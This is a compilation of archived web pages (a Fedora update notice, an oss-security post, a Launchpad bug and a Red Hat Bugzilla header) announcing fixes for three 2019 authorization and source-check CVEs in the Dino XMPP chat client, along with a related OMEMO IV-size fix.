* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-5TMGQ5Q6QMIFG4NVUWMOWW3GIPGWQZVF.mbox.gz?message=5TMGQ5Q6QMIFG4NVUWMOWW3GIPGWQZVF "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/5TMGQ5Q6QMIFG4NVUWMOWW3GIPGWQZVF/#5TMGQ5Q6QMIFG4NVUWMOWW3GIPGWQZVF)

# [SECURITY] Fedora 30 Update: dino-0.0-0.12.20190912.git.a96c801.fc30

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

19 Sep
2019

19 Sep
'19

8:22 p.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2019-3d3bb765ca
2019-09-20 01:21:28.248407
--------------------------------------------------------------------------------

Name : dino
Product : Fedora 30
Version : 0.0
Release : 0.12.20190912.git.a96c801.fc30
URL : <https://github.com/dino/dino>
Summary : Modern XMPP ("Jabber") Chat Client using GTK+/Vala
Description :
A modern XMPP ("Jabber") chat client using GTK+/Vala.

--------------------------------------------------------------------------------
Update Information:

Update dino to
[a96c8014](<https://github.com/dino/dino/compare/016ab2c1...a96c8014>), which
addresses three CVEs. CVE-2019-16235 ============== Dino did not properly
check the source of message carbons.
<https://nvd.nist.gov/vuln/detail/CVE-2019-16235> Fixed in
<https://github.com/dino/dino/commit/e84f2c49567e86d2a261ea264d65c4adc549c930>
CVE-2019-16236 ========== Dino did not check roster push authorization.
<https://nvd.nist.gov/vuln/detail/CVE-2019-16236> Fixed in
<https://github.com/dino/dino/commit/dd33f5f949248d87d34f399e8846d5ee5b8823d9>
CVE-2019-16237 ========== Dinot did not properly check the source of MAM
messages. <https://nvd.nist.gov/vuln/detail/CVE-2019-16237> Fixed in
<https://github.com/dino/dino/commit/307f16cc86dd2b95aa02ab8a85110e4a2d5e7363>
--------------------------------------------------------------------------------
ChangeLog:

\* Thu Sep 12 2019 Randy Barlow bowlofeggs@fedoraproject.org - 0.0-0.12.20190912.git.a96c8014
- Update to a96c8014.
- Fixes CVE-2019-16235 (#1751847), CVE-2019-16236 (#1751849), and CVE-2019-16237 (#1751851).
- <https://github.com/dino/dino/compare/016ab2c1...a96c8014>
\* Sat Aug 31 2019 Randy Barlow bowlofeggs@fedoraproject.org - 0.0-0.12.20190830.git.016ab2c1
- Update to 016ab2c1.
- <https://github.com/dino/dino/compare/8120203d...016ab2c1>
\* Mon Jun 3 2019 Randy Barlow bowlofeggs@fedoraproject.org - 0.9.20190601.git.8120203d
- Correct the commit date in the Release field, it was a typo in the prior commit.
\* Sat Jun 1 2019 Randy Barlow bowlofeggs@fedoraproject.org - 0.8.20190701.git.git.8120203d
- Update to 8120203d.
- <https://github.com/dino/dino/compare/f4778ef3...8120203d>
\* Sun May 5 2019 Randy Barlow bowlofeggs@fedoraproject.org - 0.0-0.7.20190429.git.f4778ef3
- Update to f4778ef3.
- <https://github.com/dino/dino/compare/330649a...f4778ef3>
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #1751851 - CVE-2019-16237: dino does not properly check the source of an MAM messages
<https://bugzilla.redhat.com/show_bug.cgi?id=1751851>
[ 2 ] Bug #1751849 - CVE-2019-16236: dino does not check roster push authorization
<https://bugzilla.redhat.com/show_bug.cgi?id=1751849>
[ 3 ] Bug #1751847 - CVE-2019-16235: Dino before does not properly check the source of a carbons
<https://bugzilla.redhat.com/show_bug.cgi?id=1751847>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2019-3d3bb765ca' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/5TMGQ5Q6QMIFG4NVUWMOWW3GIPGWQZVF/#5TMGQ5Q6QMIFG4NVUWMOWW3GIPGWQZVF)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from www.openwall.com_3451c844_20250121_005010.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <12565f8bad84ea9a77dadaaae0509b4cfa122fc3.camel@electronsweatshop.com>
Date: Thu, 12 Sep 2019 13:43:47 -0400
From: Randy Barlow <randy@...ctronsweatshop.com>
To: oss-security@...ts.openwall.com
Subject: 3 CVEs in dino

Three CVEs have been identified and fixed in Dino.

CVE-2019-16235
==============

Dino did not properly check the source of message carbons.

<https://nvd.nist.gov/vuln/detail/CVE-2019-16235>

Fixed in <https://github.com/dino/dino/commit/e84f2c49567e86d2a261ea264d65c4adc549c930>

CVE-2019-16236
==========

Dino did not check roster push authorization.

<https://nvd.nist.gov/vuln/detail/CVE-2019-16236>

Fixed in <https://github.com/dino/dino/commit/dd33f5f949248d87d34f399e8846d5ee5b8823d9>

CVE-2019-16237
==========

Dinot did not properly check the source of MAM messages.

<https://nvd.nist.gov/vuln/detail/CVE-2019-16237>

Fixed in <https://github.com/dino/dino/commit/307f16cc86dd2b95aa02ab8a85110e4a2d5e7363>

Download attachment "[signature.asc](5/1)" of type "application/pgp-signature" (834 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from bugs.launchpad.net_1e12d383_20250121_025952.html ===

[Log in / Register](https://bugs.launchpad.net/ubuntu/%2Bsource/dino-im/%2Bbug/1866115/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[dino-im package](https://launchpad.net/ubuntu/%2Bsource/dino-im)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/dino-im)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/dino-im)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/dino-im)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/dino-im)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/dino-im)

# Support reading messages with 12-byte IVs

Bug #1866115 reported by
[Julian Andres Klode](https://launchpad.net/~juliank)
on 2020-03-04

[12](/%2Bhelp-bugs/bug-heat.html)

This bug affects 2 people

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [dino-im (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/dino-im "Latest release: 0.4.4-1ubuntu2, uploaded to universe on 2025-01-06 04:32:27.683539+00:00 by Matthias Klose (doko), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Fix Released | Undecided | Unassigned |  |
|  | [Bionic](https://bugs.launchpad.net/ubuntu/bionic/%2Bsource/dino-im) | Fix Released | Critical | [Julian Andres Klode](https://launchpad.net/~juliank) |  |

### Bug Description

[Impact]

Most clients switched to 12-byte IVs for OMEMO encrypted messages, but dino only accepts 16-byte IVs.

[Test case]

Send OMEMO message from client which uses 12-byte IV, make sure it can be read.

Note that other clients might still not be able to read our messages (dino should though), this requires <https://github.com/dino/dino/commit/cc7b0aa7bd5b6599159f654fdd8a2fd111e16a3e> and will be fixed later. This change is solely to unblock dino to switch to sending 12-byte IVs.

[Regression potential]

Meh. I'm not sure what could regress here by not rejecting 12 byte IVs any longer, it's a simple if () on the IV size that we extend from == 16 to == 16 || == 12.

See [original description](comments/0)

Tags:

[verification-done-bionic](/ubuntu/%2Bsource/dino-im/%2Bbugs?field.tag=verification-done-bionic)

## CVE References

* [2019-16235](/bugs/cve/2019-16235 "Dino before 2019-09-10 does not prope...")
* [2019-16236](/bugs/cve/2019-16236 "Dino before 2019-09-10 does not check...")
* [2019-16237](/bugs/cve/2019-16237 "Dino before 2019-09-10 does not prope...")

[Julian Andres Klode (juliank)](https://launchpad.net/~juliank)
on 2020-03-04

| Changed in dino-im (Ubuntu): | |
| --- | --- |
| **status**: | New → Fix Released |
| Changed in dino-im (Ubuntu Bionic): | |
| **status**: | New → In Progress |
| **importance**: | Undecided → Critical |
| **assignee**: | nobody → Julian Andres Klode (juliank) |

[Julian Andres Klode (juliank)](https://launchpad.net/~juliank)
on 2020-03-04

| **description**: | updated |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Julian Andres Klode (juliank)](https://launchpad.net/~juliank) wrote on 2020-03-09: |  |  | [#1](/ubuntu/%2Bsource/dino-im/%2Bbug/1866115/comments/1) |
| --- | --- | --- | --- |

I have installed dino-im from the security-proposed PPA and confirmed I could receive 12-byte IV messages sent by conversations.

I have installed dino-im from the security-proposed PPA and confirmed I could receive 12-byte IV messages sent by conversations.

| **tags**: | added: verification-done-bionic |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2020-03-17: |  |  | [#2](/ubuntu/%2Bsource/dino-im/%2Bbug/1866115/comments/2) |
| --- | --- | --- | --- |

This bug was fixed in the package dino-im - 0.0.git20180130-1ubuntu0.1

---------------

dino-im (0.0.git20180130-1ubuntu0.1) bionic-security; urgency=high

\* Cherry pick upstream security fixes (LP: [#1866113](/bugs/1866113))

    - SECURITY UPDATE: Fix check of source of a carbons message (CVE-2019-16235)

    - SECURITY UPDATE: Check roster push authorization (CVE-2019-16236)

    - SECURITY UPDATE: Fix check of source of MAM message (CVE-2019-16237)

  \* Accept IV sizes of 12 in addition to 16 to enable reading messages

    sent from clients using 12-byte IVs again (LP: [#1866115](/bugs/1866115))

-- Julian Andres Klode <email address hidden> Wed, 04 Mar 2020 15:20:07 +0100

This bug was fixed in the package dino-im - 0.0.git20180130-1ubuntu0.1
---------------
dino-im (0.0.git20180130-1ubuntu0.1) bionic-security; urgency=high
\* Cherry pick upstream security fixes (LP: #1866113)
- SECURITY UPDATE: Fix check of source of a carbons message (CVE-2019-16235)
- SECURITY UPDATE: Check roster push authorization (CVE-2019-16236)
- SECURITY UPDATE: Fix check of source of MAM message (CVE-2019-16237)
\* Accept IV sizes of 12 in addition to 16 to enable reading messages
sent from clients using 12-byte IVs again (LP: #1866115)
-- Julian Andres Klode <juliank@ubuntu.com> Wed, 04 Mar 2020 15:20:07 +0100

| Changed in dino-im (Ubuntu Bionic): | |
| --- | --- |
| **status**: | In Progress → Fix Released |

[See full activity log](https://bugs.launchpad.net/ubuntu/%2Bsource/dino-im/%2Bbug/1866115/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/ubuntu/%2Bsource/dino-im/%2Bfilebug)

This report contains
**Public**
information

Everyone can see this information.

You are
[not directly subscribed to this bug's notifications.](/ubuntu/%2Bsource/dino-im/%2Bbug/1866115/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/ubuntu/%2Bsource/dino-im/%2Bbug/1866115/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/ubuntu/%2Bsource/dino-im/%2Bbug/1866115/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
6394e03
([Get the code!](https://dev.launchpad.net/))



=== Content from bugzilla.redhat.com_0930155a_20250121_025946.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1751851)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1751851)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1751851)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1751851

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1751851**](show_bug.cgi?id=1751851)
- CVE-2019-16237: dino does not properly check the source of an MAM messages

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2019-16237: dino does not properly check the source of an MAM messages

